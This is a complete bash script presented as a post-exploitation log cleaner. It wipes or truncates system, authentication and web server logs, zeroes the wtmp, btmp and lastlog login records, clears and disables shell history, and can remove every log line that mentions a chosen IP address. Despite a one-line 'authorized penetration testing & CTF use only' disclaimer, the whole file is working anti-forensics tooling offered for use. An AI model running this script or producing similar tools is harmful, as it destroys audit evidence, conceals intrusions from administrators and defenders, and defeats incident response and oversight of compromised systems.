#!/bin/bash
# =============================================================
#   Cipher Cleaner — Post-Exploitation Log Cleaner
#   Developed by Cipher Ron
#   GitHub: https://github.com/rounit-makheja
#   For authorized penetration testing & CTF use only
# =============================================================

# ── Colors ────────────────────────────────────────────────────
RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
CYAN="\033[96m"
PINK="\033[95m"
BOLD="\033[1m"
DIM="\033[2m"
RESET="\033[0m"

# ── Banner ─────────────────────────────────────────────────────
banner() {
echo -e "
${PINK}${BOLD}
  _____ _       _                 _____ _                              
 / ____(_)     | |               / ____| |                             
| |     _ _ __ | |__   ___ _ __ | |    | | ___  __ _ _ __   ___ _ __ 
| |    | | '_ \\| '_ \\ / _ \\ '__|| |    | |/ _ \\/ _\` | '_ \\ / _ \\ '__|
| |____| | |_) | | | |  __/ |   | |____| |  __/ (_| | | | |  __/ |   
 \\_____|_| .__/|_| |_|\\___|_|    \\_____|_|\\___|\\__,_|_| |_|\\___|_|   
         | |                                                           
         |_|                                                           
${RESET}
${DIM}        [ Post-Exploitation Log Cleaner ] — by Cipher Ron${RESET}
${DIM}        For authorized penetration testing & CTF use only${RESET}
"
}

# ── Log file paths ─────────────────────────────────────────────
declare -A LOG_FILES=(
    [auth.log]="/var/log/auth.log"
    [syslog]="/var/log/syslog"
    [apache_access]="/var/log/apache2/access.log"
    [apache_error]="/var/log/apache2/error.log"
    [nginx_access]="/var/log/nginx/access.log"
    [nginx_error]="/var/log/nginx/error.log"
    [bash_history]="$HOME/.bash_history"
    [wtmp]="/var/log/wtmp"
    [btmp]="/var/log/btmp"
    [lastlog]="/var/log/lastlog"
    [secure]="/var/log/secure"
    [messages]="/var/log/messages"
)

LOG_KEYS=(auth.log syslog apache_access apache_error nginx_access nginx_error bash_history wtmp btmp lastlog secure messages)

# ── Helpers ────────────────────────────────────────────────────
print_ok()   { echo -e "  ${GREEN}[✓]${RESET}  ${BOLD}$(printf '%-20s' "$1")${RESET}  $2"; }
print_fail() { echo -e "  ${RED}[✗]${RESET}  ${BOLD}$(printf '%-20s' "$1")${RESET}  $2"; }
print_warn() { echo -e "  ${YELLOW}[!]${RESET}  ${BOLD}$(printf '%-20s' "$1")${RESET}  $2"; }
print_info() { echo -e "  ${CYAN}[i]${RESET}  ${BOLD}$(printf '%-20s' "$1")${RESET}  $2"; }

check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "\n  ${YELLOW}[!]${RESET} Not running as root — some logs may be skipped.\n"
    fi
}

backup_file() {
    local path="$1"
    local ts
    ts=$(date +"%Y%m%d_%H%M%S")
    local backup="${path}.bak_${ts}"
    cp "$path" "$backup" 2>/dev/null && echo "$backup"
}

file_writable() {
    [ -f "$1" ] && [ -w "$1" ]
}

# ── Core functions ─────────────────────────────────────────────
wipe_file() {
    local name="$1"
    local path="$2"
    local safe="$3"

    if ! file_writable "$path"; then
        print_warn "$name" "not found / no permission"
        return 1
    fi

    if [ "$safe" = "true" ]; then
        local bak
        bak=$(backup_file "$path")
        print_info "$name" "backup → $bak"
    fi

    > "$path" 2>/dev/null
    if [ $? -eq 0 ]; then
        print_ok "$name" "wiped ✓"
    else
        print_fail "$name" "failed to wipe"
    fi
}

remove_ip_from_file() {
    local name="$1"
    local path="$2"
    local ip="$3"
    local safe="$4"

    if ! file_writable "$path"; then
        print_warn "$name" "not found / no permission"
        return 1
    fi

    local total before after removed
    before=$(wc -l < "$path")
    
    if ! grep -q "$ip" "$path" 2>/dev/null; then
        print_info "$name" "no entries for $ip"
        return 0
    fi

    if [ "$safe" = "true" ]; then
        local bak
        bak=$(backup_file "$path")
        print_info "$name" "backup → $bak"
    fi

    # Use temp file for safe in-place editing
    local tmp
    tmp=$(mktemp)
    grep -v "$ip" "$path" > "$tmp" 2>/dev/null
    mv "$tmp" "$path"

    after=$(wc -l < "$path")
    removed=$((before - after))
    print_ok "$name" "${removed} line(s) removed ✓"
}

clean_bash_history() {
    local safe="$1"
    local path="$HOME/.bash_history"

    wipe_file "bash_history" "$path" "$safe"

    # Clear current session history
    history -c 2>/dev/null
    unset HISTFILE 2>/dev/null
    export HISTSIZE=0
    export HISTFILESIZE=0
    print_ok "session history" "cleared ✓"
}

clean_binary_log() {
    local name="$1"
    local path="$2"

    if ! file_writable "$path"; then
        print_warn "$name" "not found / no permission"
        return 1
    fi

    # Zero out binary log
    cat /dev/null > "$path" 2>/dev/null
    if [ $? -eq 0 ]; then
        print_ok "$name" "zeroed ✓"
    else
        print_fail "$name" "failed"
    fi
}

# ── Modes ──────────────────────────────────────────────────────
mode_status() {
    echo -e "\n  ${BOLD}${PINK}[ Log Status ]${RESET}\n"
    for key in "${LOG_KEYS[@]}"; do
        local path="${LOG_FILES[$key]}"
        if [ -f "$path" ]; then
            local size perm
            size=$(du -h "$path" 2>/dev/null | cut -f1)
            if [ -w "$path" ]; then
                perm="writable"
            else
                perm="read-only"
            fi
            print_ok "$key" "$(printf '%8s' $size)  [$perm]  ${DIM}$path${RESET}"
        else
            print_warn "$key" "not found"
        fi
    done
    echo
}

mode_all() {
    local safe="$1"
    echo -e "\n  ${BOLD}${PINK}[ Full Clean Mode ]${RESET}\n"
    check_root

    local text_logs=(auth.log syslog apache_access apache_error nginx_access nginx_error secure messages)
    local binary_logs=(wtmp btmp lastlog)

    for key in "${text_logs[@]}"; do
        wipe_file "$key" "${LOG_FILES[$key]}" "$safe"
    done

    clean_bash_history "$safe"

    for key in "${binary_logs[@]}"; do
        clean_binary_log "$key" "${LOG_FILES[$key]}"
    done

    echo -e "\n  ${GREEN}${BOLD}[✓] Full clean complete.${RESET}\n"
}

mode_ip() {
    local ip="$1"
    local safe="$2"
    echo -e "\n  ${BOLD}${PINK}[ IP Filter Mode — $ip ]${RESET}\n"
    check_root

    # Validate IP format
    if ! echo "$ip" | grep -qE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$'; then
        echo -e "  ${RED}[✗]${RESET} Invalid IP format: $ip"
        exit 1
    fi

    local text_logs=(auth.log syslog apache_access apache_error nginx_access nginx_error secure messages)
    for key in "${text_logs[@]}"; do
        remove_ip_from_file "$key" "${LOG_FILES[$key]}" "$ip" "$safe"
    done

    echo -e "\n  ${GREEN}${BOLD}[✓] IP $ip entries removed.${RESET}\n"
}

mode_select() {
    local safe="$1"
    echo -e "\n  ${BOLD}${PINK}[ Select Mode ]${RESET}\n"
    check_root

    local i=1
    for key in "${LOG_KEYS[@]}"; do
        local path="${LOG_FILES[$key]}"
        local exists=" "
        [ -f "$path" ] && exists="✓"
        echo -e "  ${CYAN}[$(printf '%2d' $i)]${RESET}  $exists  $(printf '%-20s' $key)  ${DIM}$path${RESET}"
        ((i++))
    done

    echo -e "\n  Enter numbers to clean (comma-separated), e.g. ${BOLD}1,3,5${RESET}"
    echo -ne "  ${PINK}cipher>${RESET} "
    read -r input

    IFS=',' read -ra choices <<< "$input"

    echo
    for choice in "${choices[@]}"; do
        choice=$(echo "$choice" | tr -d ' ')
        if [[ "$choice" =~ ^[0-9]+$ ]]; then
            local idx=$((choice - 1))
            if [ "$idx" -ge 0 ] && [ "$idx" -lt "${#LOG_KEYS[@]}" ]; then
                local key="${LOG_KEYS[$idx]}"
                local path="${LOG_FILES[$key]}"
                case "$key" in
                    wtmp|btmp|lastlog)
                        clean_binary_log "$key" "$path" ;;
                    bash_history)
                        clean_bash_history "$safe" ;;
                    *)
                        wipe_file "$key" "$path" "$safe" ;;
                esac
            fi
        fi
    done

    echo -e "\n  ${GREEN}${BOLD}[✓] Selected logs cleaned.${RESET}\n"
}

usage() {
    echo -e "
  ${BOLD}Usage:${RESET}
    sudo bash ciphercleaner.sh [MODE] [OPTIONS]

  ${BOLD}Modes:${RESET}
    --status            Show all log file sizes & permissions
    --all               Wipe ALL log files at once
    --ip <address>      Remove entries for a specific IP only
    --select            Interactive menu — pick what to clean

  ${BOLD}Options:${RESET}
    --safe              Backup files before cleaning
    -h, --help          Show this help

  ${BOLD}Examples:${RESET}
    sudo bash ciphercleaner.sh --status
    sudo bash ciphercleaner.sh --all
    sudo bash ciphercleaner.sh --all --safe
    sudo bash ciphercleaner.sh --ip 192.168.1.10
    sudo bash ciphercleaner.sh --ip 192.168.1.10 --safe
    sudo bash ciphercleaner.sh --select
"
}

# ── Argument parsing ───────────────────────────────────────────
banner

MODE=""
IP=""
SAFE="false"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --all)    MODE="all" ;;
        --ip)     MODE="ip"; IP="$2"; shift ;;
        --select) MODE="select" ;;
        --status) MODE="status" ;;
        --safe)   SAFE="true" ;;
        -h|--help) usage; exit 0 ;;
        *) echo -e "  ${RED}[✗]${RESET} Unknown option: $1\n"; usage; exit 1 ;;
    esac
    shift
done

case "$MODE" in
    status) mode_status ;;
    all)    mode_all "$SAFE" ;;
    ip)     mode_ip "$IP" "$SAFE" ;;
    select) mode_select "$SAFE" ;;
    *)      usage ;;
esac
